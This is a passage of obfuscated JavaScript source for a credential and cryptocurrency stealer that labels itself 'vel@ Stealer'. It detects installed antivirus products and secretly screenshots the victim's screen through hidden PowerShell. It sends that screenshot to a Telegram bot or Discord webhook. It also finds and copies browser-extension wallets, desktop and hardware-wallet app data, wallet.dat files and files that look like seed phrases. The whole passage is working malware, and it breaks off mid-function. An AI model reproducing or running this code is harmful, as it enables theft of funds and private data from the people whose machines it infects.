    processes: ["eSafe.exe", "eSafeSvc.exe", "eSafeAgent.exe"]
  }, {
    name: "eTrust",
    processes: ["VetMsg.exe", "VetTray.exe", "eTrust.exe"]
  }, {
    name: "F-Prot",
    processes: ["FProtTray.exe", "FProtSvc.exe", "FProt.exe"]
  }, {
    name: "Grisoft",
    processes: ["avgcc.exe", "avgw.exe", "Grisoft.exe"]
  }, {
    name: "Hacksoft",
    processes: ["Hacksoft.exe", "HacksoftSvc.exe", "HacksoftAgent.exe"]
  }, {
    name: "Hauri",
    processes: ["Hauri.exe", "HauriSvc.exe", "HauriAgent.exe"]
  }, {
    name: "IKARUS",
    processes: ["IKARUS.exe", "IKARUSSvc.exe", "IKARUSAgent.exe"]
  }, {
    name: "Jetico",
    processes: ["Jetico.exe", "JeticoSvc.exe", "JeticoAgent.exe"]
  }, {
    name: "K7 Computing",
    processes: ["K7TSecurity.exe", "K7TSMain.exe", "K7TSAgent.exe"]
  }, {
    name: "Norman",
    processes: ["Norman.exe", "NormanSvc.exe", "NormanAgent.exe"]
  }, {
    name: "PC Tools",
    processes: ["PCTools.exe", "PCToolsSvc.exe", "PCToolsAgent.exe"]
  }, {
    name: "Prevx",
    processes: ["Prevx.exe", "PrevxSvc.exe", "PrevxAgent.exe"]
  }, {
    name: "Secure Computing",
    processes: ["SecureComputing.exe", "SecureComputingSvc.exe", "SecureComputingAgent.exe"]
  }, {
    name: "SecureWave",
    processes: ["SecureWave.exe", "SecureWaveSvc.exe", "SecureWaveAgent.exe"]
  }, {
    name: "Sunbelt",
    processes: ["Sunbelt.exe", "SunbeltSvc.exe", "SunbeltAgent.exe"]
  }, {
    name: "The Hacker",
    processes: ["TheHacker.exe", "TheHackerSvc.exe", "TheHackerAgent.exe"]
  }, {
    name: "UNA",
    processes: ["UNA.exe", "UNASvc.exe", "UNAAgent.exe"]
  }, {
    name: "VirusBuster",
    processes: ["VirusBuster.exe", "VirusBusterSvc.exe", "VirusBusterAgent.exe"]
  }];
  try {
    const {
      stdout: _0x25ba8d
    } = await execAsync("tasklist /FO CSV /NH");
    const _0x43e287 = _0x25ba8d.split("\n");
    const _0x326ef4 = new Set();
    for (const _0x3f980d of _0x43e287) {
      const _0x8991ce = _0x3f980d.split(",");
      if (_0x8991ce.length > 0) {
        const _0x6205ae = _0x8991ce[0].replace(/"/g, "");
        _0x326ef4.add(_0x6205ae.toLowerCase());
      }
    }
    for (const _0x4116d0 of _0x49ed11) {
      for (const _0x1f9f05 of _0x4116d0.processes) {
        if (_0x326ef4.has(_0x1f9f05.toLowerCase())) {
          _0x4c09af.push(_0x4116d0.name);
          break;
        }
      }
    }
  } catch (_0x36ae4d) {}
  return [...new Set(_0x4c09af)];
}
async function sendScreenshotToWebhook() {
  try {
    const _0x396fe8 = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $memoryStream = New-Object System.IO.MemoryStream; $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png); $bytes = $memoryStream.ToArray(); [System.Console]::OpenStandardOutput().Write($bytes, 0, $bytes.Length); $bitmap.Dispose(); $graphics.Dispose(); $memoryStream.Dispose();";
    const _0x3dd6fd = execSync("powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"" + _0x396fe8 + "\"", {
      encoding: null,
      maxBuffer: 10485760
    });
    if (CONFIG.logMethod === "telegram") {
      const {
        token: _0x3418a4,
        chatId: _0x17d4d2
      } = CONFIG.telegram;
      if (_0x3418a4 && _0x17d4d2) {
        const _0xdf937c = _0x1e8ec6 => Buffer.from(_0x1e8ec6, "base64").toString();
        const _0x13abc5 = _0xdf937c("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn");
        const _0x28062f = _0xdf937c("Ym90");
        const _0x156c94 = _0xdf937c("c2VuZFBob3Rv");
        const _0x3ab70e = new FormData();
        _0x3ab70e.append("chat_id", _0x17d4d2);
        _0x3ab70e.append("photo", _0x3dd6fd, {
          filename: "screenshot.png"
        });
        _0x3ab70e.append("caption", "Victim Screenshot\nvel@ Stealer | Sikibidi sigma boy");
        await axios.post(_0x13abc5 + "/" + _0x28062f + _0x3418a4 + "/" + _0x156c94, _0x3ab70e, {
          headers: _0x3ab70e.getHeaders()
        });
      }
    } else {
      const _0x1107c3 = new FormData();
      const _0x1148e5 = {
        title: "Victim Screenshot",
        color: 2895667,
        image: {
          url: "attachment://screenshot.png"
        },
        footer: {
          text: "vel@ Stealer | Sikibidi sigma boy"
        },
        timestamp: new Date().toISOString()
      };
      const _0x5236e3 = {
        username: "Vel@ Stealer",
        avatar_url: "https://i.pinimg.com/736x/45/30/ef/4530ef26b1079ebc09718d5b7bac7ed3.jpg",
        embeds: [_0x1148e5]
      };
      _0x1107c3.append("payload_json", JSON.stringify(_0x5236e3));
      _0x1107c3.append("file", _0x3dd6fd, {
        filename: "screenshot.png",
        contentType: "image/png"
      });
      await axios.post(CONFIG.webhook, _0x1107c3, {
        headers: _0x1107c3.getHeaders(),
        maxContentLength: Infinity,
        maxBodyLength: Infinity
      });
    }
    console.log("[+] Screenshot sent successfully");
  } catch (_0x272f2e) {
    console.error("[-] Screenshot error:", _0x272f2e.message);
  }
}
const browserWalletPaths = {
  Chrome: {
    base: path.join(localappdata, ["G", "o", "o", "g", "l", "e"].join(""), ["C", "h", "r", "o", "m", "e"].join(""), ["User", " ", "Data"].join("")),
    wallets: {
      MetaMask: "nkbihfbeogaeaoehlefnkodbefgpgknn",
      Phantom: "bfnaelmomeimhlpmgjnjophhpkkoljpa",
      "Coinbase Wallet": "hnfanknocfeofbddgcijnmhnfnkdnaad",
      "Binance Wallet": "fhbohimaelbohpjbbldcngcnapndodjp",
      "Trust Wallet": "egjidjbpglichdcondbcbdnbeeppgdph",
      Exodus: "aholpfdialjgjfhomihkjbmgjidlcdno",
      "Atomic Wallet": "fhilaheimglignddkjgofkcbgekhenbh",
      "Math Wallet": "afbcbjpbpfadlkmhmclhkeeodmamcflc",
      BitKeep: "jiidiaalihmmhddjgbnbgdfflelocpak",
      "OKX Wallet": "mcohilncbfahbmgdjkbpemcciiolgcge",
      "Rabby Wallet": "acmacodkjbdgmoleebolmdjonilkdbch",
      "XDEFI Wallet": "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
      SafePal: "lgmpcpglpngdoalbgeoldeajfclnhafa",
      Keplr: "dmkamcknogkgcdfhhbddcghachkejeap",
      "Terra Station": "aiifbnbfobpmeekipheeijimdpnlpgpp",
      Nami: "lpfcbjknijpeeillifnkikgncikgfhdo",
      Eternl: "kmhcihpebfmpgmihbkipmjlmmioameka",
      Yoroi: "ffnbelfdoeiohenkjibnmadjiehjhajb",
      TronLink: "ibnejdfjmmkpcnlpebklmnkoeoihofec",
      "Ronin Wallet": "fnjhmkhhmkbjkkabndcnnogagogbneec",
      Liquality: "kpfopkelmapcoipemfendmdcghnegimn",
      Solflare: "bhhhlbepdkbapadjdnnojkbgioiodbic",
      Slope: "pocmplpaccanhmnllbbkpgfliimjljgo",
      Braavos: "jnlgamecbpmbajjfhmmmlhejkemejdma",
      Polymesh: "jojhfeoedkpkglbfimdfabpdfjaoolaf",
      ICONex: "flpiciilemghbmfalicajoolhkkenfel",
      Nabox: "nknhiehlklippafakaeklbeglecifhad",
      KardiaChain: "pdadjkfkgcafgbceimcpbkalnfnepbnk",
      Wombat: "amkmjjmmflddogmhpjloimipbofnfjih",
      "MEW CX": "nlbmnnijcnlegkjjpcfjclmcfggfefdm",
      Guarda: "hpglfhgfnhbgpjdenjgmdgoeiappafln",
      "EVER Wallet": "cgeeodpfagjceefieflmdfphplkenlfk",
      Clover: "nhnkbkgjikgcigadomkphalanndcapjk",
      "Leather (Hiro)": "ldinpeekobnhjjdofggfgjlcehhmanlj",
      "Sui Wallet": "opcgpfmipidbgpenhmajoajpbobppdil",
      "Petra Aptos": "ejjladinnckdgjemekebdpeokbikhfci",
      "Martian Aptos": "efbglgofoippbgcjepnhiblaibcnclgk",
      "Pontem Aptos": "phkbamefinggmakgklpkljjmgibohnba",
      "Sender Wallet": "epapihdplajcdnnkdeiahlgigofloibg",
      Goby: "jnkelfanjkeadonecabehalmbgpfodjm",
      "Leap Cosmos": "fcfcfllfndlomdhbehjjcoimbgofdncg",
      Core: "agoakfejjabomempkjlepdflaleeobhb",
      Harmony: "fnnegphlobjdpkhecapkijjdkgcjhkib",
      Enkrypt: "kkpllkodjeloidieedojogacfhpaihoh",
      "Opera Wallet": "nkddgncdjgjfcddamfgcmfnlhccnimig",
      Rainbow: "opfgelmcmbiajamepnmloijbpoleiama",
      Zerion: "klghhnkeealcohjjanjjdaeeggmfmlpl",
      Talisman: "fijngjgcjhjmmpcmkeiomlglpeiijkld",
      Backpack: "aflkmfhebedbjioipglgcbcmnbpgliof",
      Fordefi: "gnagcihlkglhdgaadhekmihmlnomkdei",
      SubWallet: "onhogfjeacnfoofkfgppdlbmlmnplgbn",
      PolkadotJS: "mopnmbcafieddcagagdcbnhejhlodfdd",
      Compass: "anokgmphncpekkhclmingpimjmcooifb",
      OWallet: "hhejbopdnpbjgomhpmegemnjdwerdhhl",
      Cosmostation: "fpkhgmpbidmiogeglndfbkegfdlnajnf",
      Frontier: "kppfdiipphfccemcignhifpjkapfbihd",
      Bifrost: "gfbapjadghcjbjbimlgpnkjomgkkidlg",
      Frame: "ldcoohedfbjoobcadoglnnmmfbdlmmhf",
      Noone: "mjhibnmklpkhdfmhpgmihcikaclklkdb",
      Temple: "ookjlbkiijinhpmnjffcofjonbfbgaoc",
      Beacon: "gpfndedineagiepkpinficbcbbgjoenn",
      Kukai: "dhoiejdeibakejckcmgdcbakjdjoklco",
      Spire: "gpaigehiakghopkbbgpolppmojpckklm",
      Umami: "bkdaaifcdibjmbknjcmbagpepkbhfjhg",
      Cyano: "dkdedlpgdmmkkfjabffeganieamfklkm",
      OneKey: "jnmbobjmhlngoefaiojfljckilhhlhcj",
      "Safepal Extension": "lgmpcpglpngdoalbgeoldeajfclnhafa",
      "Slope Finance": "pocmplpaccanhmnllbbkpgfliimjljgo",
      Coin98: "aeachknmefphepccionboohckonoeemg",
      TokenPocket: "mfgccjchihfkkindfppnaooecgfneiii",
      ioPay: "ilgbfbicnkangdlofblackcoignjacni",
      Auro: "cnmamaachppnkjgnildpdlbmlmnplgbn",
      Leafkey: "bhmejakjdfmhfobdamfbpeocicjdajij",
      "OneKey (Legacy)": "infeboajgfhgbjpjbeppbkgnabfdkdaf",
      Nifty: "jbdaocneiiinmjbjlgalhcelgbejmnid",
      BoltX: "aodkkagnadcbobfpggfnjeongemjbjca",
      "Liquality Wallet": "kpfopkelmapcoipemfendmdcghnegimn",
      Saturn: "nkddgncdjgjfcddamfgcmfnlhccnimig",
      Guild: "nanjmdknhkinifnkgdcggcfnhdaammmj",
      "Taho (Tally Ho)": "eajafomhmkipbjmfmhebemolkcicgfmd",
      Xverse: "idnnbdplmphpflfnlkomgpfbpcgelopg",
      "DeFi Wallet": "klhkobkdpphfpioepbgjhdeomkdafgme",
      Avail: "kkpllkodjeloidieedojogacfhpaihoh",
      MewCx: "nlbmnnijcnlegkjjpcfjclmcfggfefdm",
      "Casper Signer": "djhndpllfiibmcdbnmaaahkhchcoijce",
      "Subwallet Polkadot": "onhogfjeacnfoofkfgppdlbmlmnplgbn",
      Finnie: "cjmkndjhnagcfbpiemnkdpomccnjblmj",
      Stargazer: "pgiaagfkgcbnmiiolekcfmljdagdhlcm",
      "Polymesh Wallet": "jojhfeoedkpkglbfimdfabpdfjaoolaf",
      "Martian Wallet": "efbglgofoippbgcjepnhiblaibcnclgk",
      "Maiar DeFi": "dngmlblcodfobpdpecaadgfbcggfjfnm",
      "Flint Wallet": "hnhobjmcibchnmglfbldbfabcgaknlkj",
      Sender: "epapihdplajcdnnkdeiahlgigofloibg",
      "Brave Wallet": "odbfpeeihdkbihmopkbjmoonfanlbfcl"
    }
  },
  Edge: {
    base: path.join(localappdata, ["M", "i", "c", "r", "o", "s", "o", "f", "t"].join(""), ["E", "d", "g", "e"].join(""), ["User", " ", "Data"].join("")),
    wallets: {
      MetaMask: "ejbalbakoplchlghecdalmeeeajnimhm",
      Phantom: "bfnaelmomeimhlpmgjnjophhpkkoljpa",
      "Coinbase Wallet": "hnfanknocfeofbddgcijnmhnfnkdnaad",
      "Binance Wallet": "fhbohimaelbohpjbbldcngcnapndodjp",
      "Trust Wallet": "egjidjbpglichdcondbcbdnbeeppgdph"
    }
  },
  Brave: {
    base: path.join(localappdata, ["B", "r", "a", "v", "e", "S", "o", "f", "t", "w", "a", "r", "e"].join(""), ["B", "r", "a", "v", "e", "-", "B", "r", "o", "w", "s", "e", "r"].join(""), ["User", " ", "Data"].join("")),
    wallets: {
      MetaMask: "nkbihfbeogaeaoehlefnkodbefgpgknn",
      Phantom: "bfnaelmomeimhlpmgjnjophhpkkoljpa",
      "Coinbase Wallet": "hnfanknocfeofbddgcijnmhnfnkdnaad"
    }
  },
  Opera: {
    base: path.join(appData, "Opera Software", "Opera Stable"),
    wallets: {
      MetaMask: "nkbihfbeogaeaoehlefnkodbefgpgknn",
      Phantom: "bfnaelmomeimhlpmgjnjophhpkkoljpa"
    }
  },
  OperaGX: {
    base: path.join(appData, "Opera Software", "Opera GX Stable"),
    wallets: {
      MetaMask: "nkbihfbeogaeaoehlefnkodbefgpgknn",
      Phantom: "bfnaelmomeimhlpmgjnjophhpkkoljpa"
    }
  }
};
const desktopWalletPaths = {
  Exodus: path.join(appData, "Exodus", "exodus.wallet"),
  Atomic: path.join(appData, "atomic", "Local Storage", "leveldb"),
  Electrum: path.join(appData, "Electrum", "wallets"),
  Ethereum: path.join(appData, "Ethereum", "keystore"),
  Monero: path.join(appData, "Monero"),
  Bytecoin: path.join(appData, "bytecoin"),
  "Jaxx Liberty": path.join(appData, "com.liberty.jaxx", "IndexedDB"),
  Zcash: path.join(appData, "Zcash"),
  Armory: path.join(appData, "Armory"),
  Coinomi: path.join(localappdata, "Coinomi", "Coinomi", "wallets"),
  Guarda: path.join(appData, "Guarda"),
  Wasabi: path.join(appData, "WalletWasabi", "Client", "Wallets"),
  "Bitcoin Core": path.join(appData, "Bitcoin", "wallets"),
  Bitcoin: path.join(appData, "Bitcoin"),
  Litecoin: path.join(appData, "Litecoin"),
  "Litecoin Core": path.join(appData, "Litecoin", "wallets"),
  "Dash Core": path.join(appData, "DashCore", "wallets"),
  Dash: path.join(appData, "DashCore"),
  Dogecoin: path.join(appData, "Dogecoin"),
  "Dogecoin Core": path.join(appData, "Dogecoin", "wallets"),
  Daedalus: path.join(appData, "Daedalus", "wallets"),
  Yoroi: path.join(appData, "Yoroi"),
  Nami: path.join(appData, "Nami"),
  Eternl: path.join(appData, "eternl"),
  MultiBit: path.join(appData, "MultiBit"),
  Binance: path.join(appData, "Binance"),
  "com.liberty.jaxx": path.join(appData, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb")
};
const coldWalletPaths = {
  "Ledger Live": path.join(appData, "Ledger Live"),
  Ledger: path.join(appData, "Ledger Live", "Local Storage", "leveldb"),
  "Trezor Suite": path.join(appData, "Trezor Suite"),
  Trezor: path.join(appData, "Trezor Suite", "IndexedDB"),
  KeepKey: path.join(appData, "KeepKey"),
  BitBox: path.join(appData, "BitBox")
};
async function extractBrowserWallets() {
  const _0x2ec8ab = [];
  for (const [_0x511ff2, _0x409593] of Object.entries(browserWalletPaths)) {
    if (!fs.existsSync(_0x409593.base)) {
      continue;
    }
    const _0x23a046 = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"];
    for (const _0x3666c8 of _0x23a046) {
      const _0x1b8c2f = path.join(_0x409593.base, _0x3666c8);
      if (!fs.existsSync(_0x1b8c2f)) {
        continue;
      }
      const _0x40d4c3 = path.join(_0x1b8c2f, "Local Extension Settings");
      if (!fs.existsSync(_0x40d4c3)) {
        continue;
      }
      for (const [_0x405b47, _0x10f22b] of Object.entries(_0x409593.wallets)) {
        const _0x326f47 = path.join(_0x40d4c3, _0x10f22b);
        if (fs.existsSync(_0x326f47)) {
          try {
            const _0x453e0c = {
              browser: _0x511ff2,
              profile: _0x3666c8,
              wallet: _0x405b47,
              extensionId: _0x10f22b,
              path: _0x326f47,
              files: []
            };
            const _0x435000 = _0x453e0c;
            const _0x1d289d = fs.readdirSync(_0x326f47);
            for (const _0x2ec509 of _0x1d289d) {
              const _0x36713a = path.join(_0x326f47, _0x2ec509);
              const _0x576706 = fs.statSync(_0x36713a);
              if (_0x576706.isFile()) {
                const _0x4a2fdc = {
                  name: _0x2ec509,
                  size: _0x576706.size,
                  path: _0x36713a
                };
                _0x435000.files.push(_0x4a2fdc);
              }
            }
            _0x2ec8ab.push(_0x435000);
          } catch (_0xb304fb) {}
        }
      }
    }
  }
  return _0x2ec8ab;
}
async function copyBrowserWallets(_0x12c81b, _0x28fc84) {
  const _0x516de0 = path.join(_0x28fc84, "Browser_Wallets");
  fs.mkdirSync(_0x516de0, {
    recursive: true
  });
  for (const _0x420960 of _0x12c81b) {
    const _0x5deeaa = path.join(_0x516de0, (_0x420960.browser + "_" + _0x420960.profile + "_" + _0x420960.wallet).replace(/[<>:"/\\|?*]/g, "_"));
    fs.mkdirSync(_0x5deeaa, {
      recursive: true
    });
    fs.writeFileSync(path.join(_0x5deeaa, "info.json"), JSON.stringify(_0x420960, null, 2), "utf8");
    let _0x379736 = 0;
    const _0x453c73 = 5242880;
    const _0x1a7f2c = 20971520;
    for (const _0xa1dbd2 of _0x420960.files) {
      try {
        if (_0xa1dbd2.size > _0x453c73) {
          continue;
        }
        if (_0x379736 + _0xa1dbd2.size > _0x1a7f2c) {
          break;
        }
        const _0x56778b = path.join(_0x5deeaa, _0xa1dbd2.name);
        fs.copyFileSync(_0xa1dbd2.path, _0x56778b);
        _0x379736 += _0xa1dbd2.size;
      } catch (_0x3f59cb) {}
    }
  }
  return _0x516de0;
}
async function extractDesktopWallets() {
  const _0x3e483a = [];
  for (const [_0x5ffa9, _0x9b3f47] of Object.entries(desktopWalletPaths)) {
    if (fs.existsSync(_0x9b3f47)) {
      try {
        const _0x59c1eb = fs.statSync(_0x9b3f47);
        const _0x4beead = {
          name: _0x5ffa9,
          path: _0x9b3f47,
          type: _0x59c1eb.isDirectory() ? "directory" : "file",
          size: _0x59c1eb.isFile() ? _0x59c1eb.size : null,
          files: []
        };
        if (_0x59c1eb.isDirectory()) {
          const _0x54ba25 = getAllFilesWallet(_0x9b3f47, null, [], 0, 2);
          _0x4beead.files = _0x54ba25.slice(0, 30).map(_0x4dee68 => {
            try {
              return {
                name: path.relative(_0x9b3f47, _0x4dee68),
                path: _0x4dee68,
                size: fs.statSync(_0x4dee68).size
              };
            } catch (_0xce8201) {
              return null;
            }
          }).filter(_0x3162fe => _0x3162fe !== null);
        }
        _0x3e483a.push(_0x4beead);
      } catch (_0x290a7c) {}
    }
  }
  return _0x3e483a;
}
async function copyDesktopWallets(_0x571a6f, _0x422aae) {
  const _0x31246d = path.join(_0x422aae, "Desktop_Wallets");
  fs.mkdirSync(_0x31246d, {
    recursive: true
  });
  for (const _0x53171d of _0x571a6f) {
    const _0x2650ec = path.join(_0x31246d, _0x53171d.name.replace(/[<>:"/\\|?*]/g, "_"));
    fs.mkdirSync(_0x2650ec, {
      recursive: true
    });
    fs.writeFileSync(path.join(_0x2650ec, "info.json"), JSON.stringify(_0x53171d, null, 2), "utf8");
    if (_0x53171d.type === "directory") {
      const _0x1219ed = _0x53171d.files.slice(0, 70);
      for (const _0x32de84 of _0x1219ed) {
        try {
          const _0x82e22a = _0x32de84.name;
          const _0x162d8f = path.join(_0x2650ec, _0x82e22a);
          const _0x258dcb = path.dirname(_0x162d8f);
          fs.mkdirSync(_0x258dcb, {
            recursive: true
          });
          if (_0x32de84.size < 10485760) {
            fs.copyFileSync(_0x32de84.path, _0x162d8f);
          }
        } catch (_0x3df607) {}
      }
    } else {
      try {
        const _0x42baa4 = path.join(_0x2650ec, path.basename(_0x53171d.path));
        fs.copyFileSync(_0x53171d.path, _0x42baa4);
      } catch (_0x20b259) {}
    }
  }
  return _0x31246d;
}
async function extractColdWallets() {
  const _0x5207d7 = [];
  for (const [_0x18ec01, _0x447e25] of Object.entries(coldWalletPaths)) {
    if (fs.existsSync(_0x447e25)) {
      try {
        const _0x2a62d7 = fs.statSync(_0x447e25);
        const _0x492a15 = {
          name: _0x18ec01,
          path: _0x447e25,
          type: _0x2a62d7.isDirectory() ? "directory" : "file",
          files: []
        };
        if (_0x2a62d7.isDirectory()) {
          const _0x3903cc = getAllFilesWallet(_0x447e25, null, [], 0, 2);
          _0x492a15.files = _0x3903cc.slice(0, 30).map(_0x42f051 => {
            try {
              return {
                name: path.relative(_0x447e25, _0x42f051),
                path: _0x42f051,
                size: fs.statSync(_0x42f051).size
              };
            } catch (_0x3be420) {
              return null;
            }
          }).filter(_0x3e95f3 => _0x3e95f3 !== null);
        }
        _0x5207d7.push(_0x492a15);
      } catch (_0x5ebbf4) {}
    }
  }
  return _0x5207d7;
}
async function copyColdWallets(_0x1311ce, _0x11f165) {
  const _0x556954 = path.join(_0x11f165, "Cold_Wallets");
  fs.mkdirSync(_0x556954, {
    recursive: true
  });
  for (const _0x1a78dd of _0x1311ce) {
    const _0x3e7617 = path.join(_0x556954, _0x1a78dd.name.replace(/[<>:"/\\|?*]/g, "_"));
    fs.mkdirSync(_0x3e7617, {
      recursive: true
    });
    fs.writeFileSync(path.join(_0x3e7617, "info.json"), JSON.stringify(_0x1a78dd, null, 2), "utf8");
    if (_0x1a78dd.type === "directory") {
      const _0x43d8e6 = _0x1a78dd.files.slice(0, 50);
      for (const _0x66c747 of _0x43d8e6) {
        try {
          const _0x46a7a1 = _0x66c747.name;
          const _0x114ca5 = path.join(_0x3e7617, _0x46a7a1);
          const _0x2eaa22 = path.dirname(_0x114ca5);
          fs.mkdirSync(_0x2eaa22, {
            recursive: true
          });
          if (_0x66c747.size < 10485760) {
            fs.copyFileSync(_0x66c747.path, _0x114ca5);
          }
        } catch (_0xf8d314) {}
      }
    }
  }
  return _0x556954;
}
async function findWalletDatFiles() {
  const _0x5831ac = [];
  const _0x1e0051 = [path.join(appData, "Bitcoin"), path.join(appData, "Litecoin"), path.join(appData, "Dogecoin"), path.join(appData, "DashCore"), path.join(appData, "Ethereum"), path.join(appData, "Monero")];
  for (const _0x3892ef of _0x1e0051) {
    if (!fs.existsSync(_0x3892ef)) {
      continue;
    }
    try {
      const _0x10b80b = getAllFilesWallet(_0x3892ef, "wallet.dat", [], 0, 2);
      for (const _0x5b34f0 of _0x10b80b) {
        try {
          const _0x1d65e6 = fs.statSync(_0x5b34f0);
          const _0x3f651d = {
            path: _0x5b34f0,
            size: _0x1d65e6.size,
            modified: _0x1d65e6.mtime
          };
          _0x5831ac.push(_0x3f651d);
        } catch (_0x49f50a) {}
      }
    } catch (_0x177911) {}
  }
  return _0x5831ac;
}
async function copyWalletDatFiles(_0x40b230, _0x42a7c2) {
  const _0x5548c4 = path.join(_0x42a7c2, "WalletDat_Files");
  fs.mkdirSync(_0x5548c4, {
    recursive: true
  });
  for (let _0x403e04 = 0; _0x403e04 < _0x40b230.length; _0x403e04++) {
    const _0x10ac5c = _0x40b230[_0x403e04];
    const _0x4c0ce4 = "wallet_" + (_0x403e04 + 1) + "_" + path.basename(path.dirname(_0x10ac5c.path)) + ".dat";
    const _0x19592b = path.join(_0x5548c4, _0x4c0ce4);
    try {
      fs.copyFileSync(_0x10ac5c.path, _0x19592b);
    } catch (_0x3443c0) {}
  }
  return _0x5548c4;
}
async function findSeedPhrases() {
  const _0x1cf093 = [];
  const _0x36c620 = [path.join(os.homedir(), "Desktop"), path.join(os.homedir(), "Documents")];
  const _0x43febf = [/seed/i, /mnemonic/i, /recovery.*phrase/i, /private.*key/i, /wallet.*backup/i, /crypto.*backup/i];
  const _0x1f30de = [/discord/i, /backup.*codes/i];
  for (const _0x2597c3 of _0x36c620) {
    if (!fs.existsSync(_0x2597c3)) {
      continue;
    }
    try {
      const _0x136613 = getAllFilesWallet(_0x2597c3, null, [], 0, 1).filter(_0xf7bddf => {
        const _0x33f0ed = path.extname(_0xf7bddf).toLowerCase();
        return _0x33f0ed === ".txt" || _0x33f0ed === ".doc" || _0x33f0ed === ".docx";
      });
      for (const _0x29ed09 of _0x136613) {
        const _0x3be85a = path.basename(_0x29ed09).toLowerCase();
        if (_0x1f30de.some(_0x3ce6d6 => _0x3ce6d6.test(_0x3be85a))) {
          continue;
        }
        if (_0x43febf.some(_0x37e3c3 => _0x37e3c3.test(_0x3be85a))) {
          try {
            const _0x407193 = fs.statSync(_0x29ed09);
            if (_0x407193.size < 1048576) {
              _0x1cf093.push({
                path: _0x29ed09,
                size: _0x407193.size,
                name: path.basename(_0x29ed09)
              });
            }
          } catch (_0x44bf99) {}
        }
      }
    } catch (_0x36cc0e) {}
  }
  return _0x1cf093;
}
async function copySeedFiles(_0x2cf8ac, _0x547739) {
  const _0x33961f = path.join(_0x547739, "Seed_Phrases");
  fs.mkdirSync(_0x33961f, {
    recursive: true
  });
  for (const _0x22ff55 of _0x2cf8ac) {
    try {
      const _0x51a71f = path.join(_0x33961f, _0x22ff55.name);
      fs.copyFileSync(_0x22ff55.path, _0x51a71f);
    } catch (_0x54add8) {}
  }
  return _0x33961f;
}
function getAllFilesWallet(_0x4eb6aa, _0x586cf4 = null, _0x11f25a = [], _0x5c9884 = 0, _0x130cf9 = 3) {
  if (_0x5c9884 > _0x130cf9) {
    return _0x11f25a;
  }
  try {
    const _0x266af8 = fs.readdirSync(_0x4eb6aa);
    for (const _0x15947b of _0x266af8) {
      if (_0x15947b === "node_modules" || _0x15947b === ".git" || _0x15947b === "cache" || _0x15947b === "Cache") {
        continue;
      }
      const _0x59b08b = path.join(_0x4eb6aa, _0x15947b);
      try {
        const _0x4eeed4 = fs.statSync(_0x59b08b);
        if (_0x4eeed4.isDirectory()) {
          getAllFilesWallet(_0x59b08b, _0x586cf4, _0x11f25a, _0x5c9884 + 1, _0x130cf9);
        } else if (!_0x586cf4 || _0x15947b.toLowerCase() === _0x586cf4.toLowerCase()) {
          _0x11f25a.push(_0x59b08b);
        }
      } catch (_0x59e449) {}
    }
  } catch (_0x16e08b) {}
  return _0x11f25a;
}
function formatWalletSummary(_0x4404d1) {
  let _0x4bbe3c = "vel@ Stealer - WALLET SUMMARY\n";
  _0x4bbe3c += "=".repeat(50) + "\n\n";
  _0x4bbe3c += "Generated: " + _0x4404d1.timestamp.toISOString() + "\n\n";
  if (_0x4404d1.browserWallets.length > 0) {
    _0x4bbe3c += "BROWSER WALLETS (" + _0x4404d1.browserWallets.length + ")\n";
    _0x4bbe3c += "-".repeat(30) + "\n";
    _0x4404d1.browserWallets.forEach((_0x332142, _0x1e3020) => {
      _0x4bbe3c += _0x1e3020 + 1 + ". " + _0x332142.wallet + " (" + _0x332142.browser + " - " + _0x332142.profile + ")\n";
      _0x4bbe3c += "   Extension: " + _0x332142.extensionId + "\n";
      _0x4bbe3c += "   Path: " + _0x332142.path + "\n";
      _0x4bbe3c += "   Files: " + _0x332142.files.length + "\n";
      _0x332142.files.forEach(_0xbab739 => {
        _0x4bbe3c += "     - " + _0xbab739.name + " (" + (_0xbab739.size / 1024).toFixed(1) + " KB)\n";
      });
      _0x4bbe3c += "\n";
    });
  }
  if (_0x4404d1.desktopWallets.length > 0) {
    _0x4bbe3c += "DESKTOP WALLETS (" + _0x4404d1.desktopWallets.length + ")\n";
    _0x4bbe3c += "-".repeat(30) + "\n";
    _0x4404d1.desktopWallets.forEach((_0xedfc5c, _0x459688) => {
      _0x4bbe3c += _0x459688 + 1 + ". " + _0xedfc5c.name + "\n";
      _0x4bbe3c += "   Path: " + _0xedfc5c.path + "\n";
      _0x4bbe3c += "   Files: " + _0xedfc5c.files.length + "\n";
      _0xedfc5c.files.forEach(_0x393ab5 => {
        _0x4bbe3c += "     - " + _0x393ab5.name + " (" + (_0x393ab5.size / 1024).toFixed(1) + " KB)\n";
      });
      _0x4bbe3c += "\n";
    });
  }
  if (_0x4404d1.coldWallets.length > 0) {
    _0x4bbe3c += "COLD WALLETS (" + _0x4404d1.coldWallets.length + ")\n";
    _0x4bbe3c += "-".repeat(30) + "\n";
    _0x4404d1.coldWallets.forEach((_0x560e0b, _0x2aa92d) => {
      _0x4bbe3c += _0x2aa92d + 1 + ". " + _0x560e0b.name + "\n";
      _0x4bbe3c += "   Path: " + _0x560e0b.path + "\n";
      _0x4bbe3c += "   Files: " + _0x560e0b.files.length + "\n";
      _0x560e0b.files.forEach(_0x9b6ad0 => {
        _0x4bbe3c += "     - " + _0x9b6ad0.name + " (" + (_0x9b6ad0.size / 1024).toFixed(1) + " KB)\n";
      });
      _0x4bbe3c += "\n";
    });
  }
  if (_0x4404d1.walletDatFiles.length > 0) {
    _0x4bbe3c += "WALLET.DAT FILES (" + _0x4404d1.walletDatFiles.length + ")\n";
    _0x4bbe3c += "-".repeat(30) + "\n";
    _0x4404d1.walletDatFiles.forEach((_0xae7243, _0x4dc0db) => {
      _0x4bbe3c += _0x4dc0db + 1 + ". " + _0xae7243.name + "\n";
      _0x4bbe3c += "   Path: " + _0xae7243.path + "\n";
      _0x4bbe3c += "   Size: " + (_0xae7243.size / 1024 / 1024).toFixed(1) + " MB\n\n";
    });
  }
  if (_0x4404d1.seedFiles.length > 0) {
    _0x4bbe3c += "SEED PHRASES (" + _0x4404d1.seedFiles.length + ")\n";
